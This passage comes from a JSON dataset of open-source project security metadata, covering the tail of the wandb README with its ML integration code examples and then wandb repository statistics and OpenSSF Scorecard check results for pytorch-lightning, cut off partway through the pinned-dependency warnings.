run metadata with wandb.config\n    config={\n        \"layer_1\": 512,\n        \"activation_1\": \"relu\",\n        \"dropout\": random.uniform(0.01, 0.80),\n        \"layer_2\": 10,\n        \"activation_2\": \"softmax\",\n        \"optimizer\": \"sgd\",\n        \"loss\": \"sparse_categorical_crossentropy\",\n        \"metric\": \"accuracy\",\n        \"epoch\": 8,\n        \"batch_size\": 256,\n    },\n)\n\n# [optional] use wandb.config as your config\nconfig = run.config\n\n# get the data\nmnist = tf.keras.datasets.mnist\n(x_train, y_train), (x_test, y_test) = mnist.load_data()\nx_train, x_test = x_train / 255.0, x_test / 255.0\nx_train, y_train = x_train[::5], y_train[::5]\nx_test, y_test = x_test[::20], y_test[::20]\nlabels = [str(digit) for digit in range(np.max(y_train) + 1)]\n\n# build a model\nmodel = tf.keras.models.Sequential(\n    [\n        tf.keras.layers.Flatten(input_shape=(28, 28)),\n        tf.keras.layers.Dense(config.layer_1, activation=config.activation_1),\n        tf.keras.layers.Dropout(config.dropout),\n        tf.keras.layers.Dense(config.layer_2, activation=config.activation_2),\n    ]\n)\n\n# compile the model\nmodel.compile(optimizer=config.optimizer, loss=config.loss, metrics=[config.metric])\n\n# WandbMetricsLogger will log train and validation metrics to wandb\n# WandbModelCheckpoint will upload model checkpoints to wandb\nhistory = model.fit(\n    x=x_train,\n    y=y_train,\n    epochs=config.epoch,\n    batch_size=config.batch_size,\n    validation_data=(x_test, y_test),\n    callbacks=[\n        WandbMetricsLogger(log_freq=5),\n        WandbModelCheckpoint(\"models\"),\n    ],\n)\n\n# [optional] finish the wandb run, necessary in notebooks\nrun.finish()\n```\n\nGet started integrating your Keras model with W&B today:\n\n- Run an example [Google Colab Notebook](https://wandb.me/intro-keras?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=integrations)\n- Read the [Developer Guide](https://docs.wandb.com/guides/integrations/keras?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=integrations) for technical details on how to integrate Keras with W&B.\n- Explore [W&B Reports](https://app.wandb.ai/wandb/getting-started/reports/Keras--VmlldzoyMTEwNjQ?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=integrations).\n\n</details>\n<details>\n<summary>🤗 Hugging Face Transformers</summary>\n\nPass `wandb` to the `report_to` argument when you run a script using a Hugging Face Trainer. W&B will automatically log losses,\nevaluation metrics, model topology, and gradients.\n\n**Note**: The environment you run your script in must have `wandb` installed.\n\nThe following example demonstrates how to integrate W&B with Hugging Face:\n\n```python\n# This script needs these libraries to be installed:\n#   numpy, transformers, datasets\n\nimport wandb\n\nimport os\nimport numpy as np\nfrom datasets import load_dataset\nfrom transformers import TrainingArguments, Trainer\nfrom transformers import AutoTokenizer, AutoModelForSequenceClassification\n\n\ndef tokenize_function(examples):\n    return tokenizer(examples[\"text\"], padding=\"max_length\", truncation=True)\n\n\ndef compute_metrics(eval_pred):\n    logits, labels = eval_pred\n    predictions = np.argmax(logits, axis=-1)\n    return {\"accuracy\": np.mean(predictions == labels)}\n\n\n# download prepare the data\ndataset = load_dataset(\"yelp_review_full\")\ntokenizer = AutoTokenizer.from_pretrained(\"distilbert-base-uncased\")\n\nsmall_train_dataset = dataset[\"train\"].shuffle(seed=42).select(range(1000))\nsmall_eval_dataset = dataset[\"test\"].shuffle(seed=42).select(range(300))\n\nsmall_train_dataset = small_train_dataset.map(tokenize_function, batched=True)\nsmall_eval_dataset = small_train_dataset.map(tokenize_function, batched=True)\n\n# download the model\nmodel = AutoModelForSequenceClassification.from_pretrained(\n    \"distilbert-base-uncased\", num_labels=5\n)\n\n# set the wandb project where this run will be logged\nos.environ[\"WANDB_PROJECT\"] = \"my-awesome-project\"\n\n# save your trained model checkpoint to wandb\nos.environ[\"WANDB_LOG_MODEL\"] = \"true\"\n\n# turn off watch to log faster\nos.environ[\"WANDB_WATCH\"] = \"false\"\n\n# pass \"wandb\" to the `report_to` parameter to turn on wandb logging\ntraining_args = TrainingArguments(\n    output_dir=\"models\",\n    report_to=\"wandb\",\n    logging_steps=5,\n    per_device_train_batch_size=32,\n    per_device_eval_batch_size=32,\n    evaluation_strategy=\"steps\",\n    eval_steps=20,\n    max_steps=100,\n    save_steps=100,\n)\n\n# define the trainer and start training\ntrainer = Trainer(\n    model=model,\n    args=training_args,\n    train_dataset=small_train_dataset,\n    eval_dataset=small_eval_dataset,\n    compute_metrics=compute_metrics,\n)\ntrainer.train()\n\n# [optional] finish the wandb run, necessary in notebooks\nwandb.finish()\n```\n\n- Run an example [Google Colab Notebook](http://wandb.me/hf?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=integrations).\n- Read the [Developer Guide](https://docs.wandb.com/guides/integrations/huggingface?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=integrations) for technical details on how to integrate Hugging Face with W&B.\n</details>\n\n<details>\n<summary>⚡️ PyTorch Lightning</summary>\n\nBuild scalable, structured, high-performance PyTorch models with Lightning and log them with W&B.\n\n```python\n# This script needs these libraries to be installed:\n#   torch, torchvision, pytorch_lightning\n\nimport wandb\n\nimport os\nfrom torch import optim, nn, utils\nfrom torchvision.datasets import MNIST\nfrom torchvision.transforms import ToTensor\n\nimport pytorch_lightning as pl\nfrom pytorch_lightning.loggers import WandbLogger\n\n\nclass LitAutoEncoder(pl.LightningModule):\n    def __init__(self, lr=1e-3, inp_size=28, optimizer=\"Adam\"):\n        super().__init__()\n\n        self.encoder = nn.Sequential(\n            nn.Linear(inp_size * inp_size, 64), nn.ReLU(), nn.Linear(64, 3)\n        )\n        self.decoder = nn.Sequential(\n            nn.Linear(3, 64), nn.ReLU(), nn.Linear(64, inp_size * inp_size)\n        )\n        self.lr = lr\n\n        # save hyperparameters to self.hparamsm auto-logged by wandb\n        self.save_hyperparameters()\n\n    def training_step(self, batch, batch_idx):\n        x, y = batch\n        x = x.view(x.size(0), -1)\n        z = self.encoder(x)\n        x_hat = self.decoder(z)\n        loss = nn.functional.mse_loss(x_hat, x)\n\n        # log metrics to wandb\n        self.log(\"train_loss\", loss)\n        return loss\n\n    def configure_optimizers(self):\n        optimizer = optim.Adam(self.parameters(), lr=self.lr)\n        return optimizer\n\n\n# init the autoencoder\nautoencoder = LitAutoEncoder(lr=1e-3, inp_size=28)\n\n# setup data\nbatch_size = 32\ndataset = MNIST(os.getcwd(), download=True, transform=ToTensor())\ntrain_loader = utils.data.DataLoader(dataset, shuffle=True)\n\n# initialise the wandb logger and name your wandb project\nwandb_logger = WandbLogger(project=\"my-awesome-project\")\n\n# add your batch size to the wandb config\nwandb_logger.experiment.config[\"batch_size\"] = batch_size\n\n# pass wandb_logger to the Trainer\ntrainer = pl.Trainer(limit_train_batches=750, max_epochs=5, logger=wandb_logger)\n\n# train the model\ntrainer.fit(model=autoencoder, train_dataloaders=train_loader)\n\n# [optional] finish the wandb run, necessary in notebooks\nwandb.finish()\n```\n\n- Run an example [Google Colab Notebook](http://wandb.me/lightning?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=integrations).\n- Read the [Developer Guide](https://docs.wandb.ai/guides/integrations/lightning?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=integrations) for technical details on how to integrate PyTorch Lightning with W&B.\n</details>\n<details>\n<summary>💨 XGBoost</summary>\nUse W&B Callbacks to automatically save metrics to W&B when you call `model.fit` during training.\n\nThe following code example demonstrates how your script might look like when you integrate W&B with XGBoost:\n\n```python\n# This script needs these libraries to be installed:\n#   numpy, xgboost\n\nimport wandb\nfrom wandb.xgboost import WandbCallback\n\nimport numpy as np\nimport xgboost as xgb\n\n\n# setup parameters for xgboost\nparam = {\n    \"objective\": \"multi:softmax\",\n    \"eta\": 0.1,\n    \"max_depth\": 6,\n    \"nthread\": 4,\n    \"num_class\": 6,\n}\n\n# start a new wandb run to track this script\nrun = wandb.init(\n    # set the wandb project where this run will be logged\n    project=\"my-awesome-project\",\n    # track hyperparameters and run metadata\n    config=param,\n)\n\n# download data from wandb Artifacts and prep data\nrun.use_artifact(\"wandb/intro/dermatology_data:v0\", type=\"dataset\").download(\".\")\ndata = np.loadtxt(\n    \"./dermatology.data\",\n    delimiter=\",\",\n    converters={33: lambda x: int(x == \"?\"), 34: lambda x: int(x) - 1},\n)\nsz = data.shape\n\ntrain = data[: int(sz[0] * 0.7), :]\ntest = data[int(sz[0] * 0.7) :, :]\n\ntrain_X = train[:, :33]\ntrain_Y = train[:, 34]\n\ntest_X = test[:, :33]\ntest_Y = test[:, 34]\n\nxg_train = xgb.DMatrix(train_X, label=train_Y)\nxg_test = xgb.DMatrix(test_X, label=test_Y)\nwatchlist = [(xg_train, \"train\"), (xg_test, \"test\")]\n\n# add another config to the wandb run\nnum_round = 5\nrun.config[\"num_round\"] = 5\nrun.config[\"data_shape\"] = sz\n\n# pass WandbCallback to the booster to log its configs and metrics\nbst = xgb.train(\n    param, xg_train, num_round, evals=watchlist, callbacks=[WandbCallback()]\n)\n\n# get prediction\npred = bst.predict(xg_test)\nerror_rate = np.sum(pred != test_Y) / test_Y.shape[0]\n\n# log your test metric to wandb\nrun.summary[\"Error Rate\"] = error_rate\n\n# [optional] finish the wandb run, necessary in notebooks\nrun.finish()\n```\n\n- Run an example [Google Colab Notebook](https://wandb.me/xgboost?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=integrations).\n- Read the [Developer Guide](https://docs.wandb.ai/guides/integrations/xgboost?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=integrations) for technical details on how to integrate XGBoost with W&B.\n</details>\n<details>\n<summary>🧮 Sci-Kit Learn</summary>\nUse wandb to visualize and compare your scikit-learn models' performance:\n\n```python\n# This script needs these libraries to be installed:\n#   numpy, sklearn\n\nimport wandb\nfrom wandb.sklearn import plot_precision_recall, plot_feature_importances\nfrom wandb.sklearn import plot_class_proportions, plot_learning_curve, plot_roc\n\nimport numpy as np\nfrom sklearn import datasets\nfrom sklearn.ensemble import RandomForestClassifier\nfrom sklearn.model_selection import train_test_split\n\n\n# load and process data\nwbcd = datasets.load_breast_cancer()\nfeature_names = wbcd.feature_names\nlabels = wbcd.target_names\n\ntest_size = 0.2\nX_train, X_test, y_train, y_test = train_test_split(\n    wbcd.data, wbcd.target, test_size=test_size\n)\n\n# train model\nmodel = RandomForestClassifier()\nmodel.fit(X_train, y_train)\nmodel_params = model.get_params()\n\n# get predictions\ny_pred = model.predict(X_test)\ny_probas = model.predict_proba(X_test)\nimportances = model.feature_importances_\nindices = np.argsort(importances)[::-1]\n\n# start a new wandb run and add your model hyperparameters\nrun = wandb.init(project=\"my-awesome-project\", config=model_params)\n\n# Add additional configs to wandb\nrun.config.update(\n    {\n        \"test_size\": test_size,\n        \"train_len\": len(X_train),\n        \"test_len\": len(X_test),\n    }\n)\n\n# log additional visualisations to wandb\nplot_class_proportions(y_train, y_test, labels)\nplot_learning_curve(model, X_train, y_train)\nplot_roc(y_test, y_probas, labels)\nplot_precision_recall(y_test, y_probas, labels)\nplot_feature_importances(model)\n\n# [optional] finish the wandb run, necessary in notebooks\nrun.finish()\n```\n\n- Run an example [Google Colab Notebook](https://wandb.me/scikit-colab?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=integrations).\n- Read the [Developer Guide](https://docs.wandb.ai/guides/integrations/scikit?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=integrations) for technical details on how to integrate Scikit-Learn with W&B.\n</details>\n\n&nbsp;\n\n# W&B Hosting Options\n\nWeights & Biases is available in the cloud or installed on your private infrastructure. Set up a W&B Server in a production environment in one of three ways:\n\n1. [Production Cloud](https://docs.wandb.ai/guides/hosting/hosting-options/self-managed#on-prem-private-cloud?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=hosting): Set up a production deployment on a private cloud in just a few steps using terraform scripts provided by W&B.\n2. [Dedicated Cloud](https://docs.wandb.ai/guides/hosting/hosting-options/wb-managed#dedicated-cloud?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=hosting): A managed, dedicated deployment on W&B's single-tenant infrastructure in your choice of cloud region.\n3. [On-Prem/Bare Metal](https://docs.wandb.ai/guides/hosting/how-to-guides/bare-metal?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=hosting): W&B supports setting up a production server on most bare metal servers in your on-premise data centers. Quickly get started by running `wandb server` to easily start hosting W&B on your local infrastructure.\n\nSee the [Hosting documentation](https://docs.wandb.ai/guides/hosting?utm_source=github&utm_medium=code&utm_campaign=wandb&utm_content=hosting) in the W&B Developer Guide for more information.\n\n<!-- &nbsp;\n\n# Tutorials\n\nExplore example Colab Notebooks at [wandb/examples GitHub repository](https://github.com/wandb/examples/tree/master/colabs). Here are some of our favorites:\n\n[INSERT] -->\n\n&nbsp;\n\n# Contribution guidelines\n\nWeights & Biases ❤️ open source, and we welcome contributions from the community! See the [Contribution guide](https://github.com/wandb/wandb/blob/main/CONTRIBUTING.md) for more information on the development workflow and the internals of the wandb library. For wandb bugs and feature requests, visit [GitHub Issues](https://github.com/wandb/wandb/issues) or contact support@wandb.com.\n\n&nbsp;\n\n# W&B Community\n\nBe a part of the growing W&B Community and interact with the W&B team in our [Discord](https://wandb.me/discord). Stay connected with the latest ML updates and tutorials with [W&B Fully Connected](https://wandb.ai/fully-connected).\n\n&nbsp;\n\n# License\n\n[MIT License](https://github.com/wandb/wandb/blob/main/LICENSE)\n",
        "num_commits": 7202,
        "project_age_days": 2776,
        "project_created_at": "2017-03-24",
        "latest_updated_at": "2024-10-30",
        "latest_pushed_at": "2024-10-30",
        "num_contributors": 176,
        "num_pull": 5361,
        "num_issues": 8723,
        "num_opening_issue": 1032,
        "project_size(kB)": 140966,
        "num_stargazers": 9076,
        "num_watchers": 9076,
        "num_forks": 672,
        "num_subscribers": 60,
        "SecurityPolicy_created_at": "2021-05-27 01:54:38",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "6159699e1e62a305381b32ced53db657ce7a923e",
                "url": "https://github.com/wandb/wandb/commit/6159699e1e62a305381b32ced53db657ce7a923e",
                "date": "2023-01-05 20:17:08"
            },
            {
                "commit_id": "cf35096833cbdaa72edd8afb44e06328ce4202d0",
                "url": "https://github.com/wandb/wandb/commit/cf35096833cbdaa72edd8afb44e06328ce4202d0",
                "date": "2021-05-27 01:56:04"
            },
            {
                "commit_id": "3e8dfdc68c7705989ac1a10924cd9e33077dc0d3",
                "url": "https://github.com/wandb/wandb/commit/3e8dfdc68c7705989ac1a10924cd9e33077dc0d3",
                "date": "2021-05-27 01:54:38"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "email",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "pytorchlightning/pytorch-lightning",
        "project_url": "https://github.com/pytorchlightning/pytorch-lightning",
        "SSF": {
            "date": "2024-10-29T22:53:34+07:00",
            "repo": {
                "name": "github.com/pytorchlightning/pytorch-lightning",
                "commit": "06a8d5bf33faf0a4f9a24207ae77b439354350af"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 4.9,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Warn: 'allow deletion' enabled on branch 'master'",
                        "Warn: 'allow deletion' enabled on branch 'release/stable'",
                        "Warn: 'allow deletion' enabled on branch 'release/LTS'",
                        "Info: 'force pushes' disabled on branch 'master'",
                        "Info: 'force pushes' disabled on branch 'release/stable'",
                        "Info: 'force pushes' disabled on branch 'release/LTS'",
                        "Warn: required approving review count is 1 on branch 'master'",
                        "Info: required approving review count is 3 on branch 'release/stable'",
                        "Info: required approving review count is 3 on branch 'release/LTS'",
                        "Info: codeowner review is required on branch 'master'",
                        "Info: codeowner review is required on branch 'release/stable'",
                        "Info: codeowner review is required on branch 'release/LTS'",
                        "Info: status check found to merge onto on branch 'master'",
                        "Info: status check found to merge onto on branch 'release/stable'",
                        "Info: status check found to merge onto on branch 'release/LTS'",
                        "Info: PRs are required in order to make changes on branch 'master'",
                        "Info: PRs are required in order to make changes on branch 'release/stable'",
                        "Info: PRs are required in order to make changes on branch 'release/LTS'"
                    ],
                    "score": 1,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "28 out of 28 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 9,
                    "reason": "Found 25/27 approved changesets -- score normalized to 9",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: conda-forge contributor org/company found, nteract contributor org/company found, Lightning-AI contributor org/company found, 4ML-platform contributor org/company found, ShrinkCode18 contributor org/company found, vmtk contributor org/company found, lightning ai contributor org/company found, gridai contributor org/company found, lightning.ai | grid.ai contributor org/company found, ecs-vlc contributor org/company found, pytorchlightning & grid.ai contributor org/company found, target contributor org/company found, codezonediitj contributor org/company found, AIMalloc contributor org/company found, PyTorch-Docathon contributor org/company found, pytorchbearer contributor org/company found, university of amsterdam contributor org/company found, tensorwerk contributor org/company found, Lightning-Universe contributor org/company found, kumo-ai contributor org/company found, PhoenixDL contributor org/company found, InsightSoftwareConsortium contributor org/company found, lightning-ai contributor org/company found, delira-dev contributor org/company found, rwth-lfb contributor org/company found, umsatz contributor org/company found, ml @premai-io | previously @shopadvisor-ai mazaal ai @lightning-ai @episource contributor org/company found, infinite-imaging contributor org/company found, deshaw contributor org/company found, nvidia contributor org/company found, omni-us contributor org/company found, orobix contributor org/company found, apache contributor org/company found, commontk contributor org/company found, Lightning-Sandbox contributor org/company found, poolsideai contributor org/company found, lightning.ai | pytorch lightning contributor org/company found, Indi-Quantum-Community contributor org/company found, pyg-team contributor org/company found, kumo-ai @pyg-team contributor org/company found, cilgroup contributor org/company found, archTk contributor org/company found, revisioneer contributor org/company found, gofigure2 contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 44 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": [
                        "Warn: untrusted code checkout '${{ github.event.pull_request.head.sha }}': .github/workflows/tpu-tests.yml:46"
                    ],
                    "score": 0,
                    "reason": "dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: Apache License 2.0: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 commit(s) and 0 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Info: Project packages its releases by way of GitHub Actions.: .github/workflows/docker-build.yml:35"
                    ],
                    "score": 10,
                    "reason": "packaging workflow detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/_build-packages.yml:25: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/_build-packages.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/_build-packages.yml:31: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/_build-packages.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/_build-packages.yml:46: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/_build-packages.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/_build-packages.yml:47: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/_build-packages.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/_build-packages.yml:51: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/_build-packages.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/_build-packages.yml:66: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/_build-packages.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/_legacy-checkpoints.yml:58: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/_legacy-checkpoints.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/_legacy-checkpoints.yml:60: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/_legacy-checkpoints.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/_legacy-checkpoints.yml:107: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/_legacy-checkpoints.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/_legacy-checkpoints.yml:133: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/_legacy-checkpoints.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/_legacy-checkpoints.yml:142: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/_legacy-checkpoints.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci-pkg-install.yml:49: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/ci-pkg-install.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci-pkg-install.yml:50: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/ci-pkg-install.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci-pkg-install.yml:53: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/ci-pkg-install.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci-rtfd.yml:14: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/ci-rtfd.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci-tests-fabric.yml:89: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/ci-tests-fabric.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci-tests-fabric.yml:92: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/ci-tests-fabric.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci-tests-fabric.yml:113: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/ci-tests-fabric.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci-tests-fabric.yml:174: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/ci-tests-fabric.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci-tests-pytorch.yml:94: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/ci-tests-pytorch.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci-tests-pytorch.yml:97: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/ci-tests-pytorch.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci-tests-pytorch.yml:119: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/ci-tests-pytorch.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci-tests-pytorch.yml:162: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/ci-tests-pytorch.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci-tests-pytorch.yml:211: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/ci-tests-pytorch.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/cleanup-caches.yml:12: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/cleanup-caches.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/code-checks.yml:31: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/code-checks.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/code-checks.yml:32: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/code-checks.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/code-checks.yml:37: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/code-checks.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docker-build.yml:51: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/docker-build.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/docker-build.yml:54: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/docker-build.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/docker-build.yml:55: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/docker-build.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/docker-build.yml:85: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/docker-build.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docker-build.yml:111: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/docker-build.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/docker-build.yml:112: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/docker-build.yml/master?enable=pin",
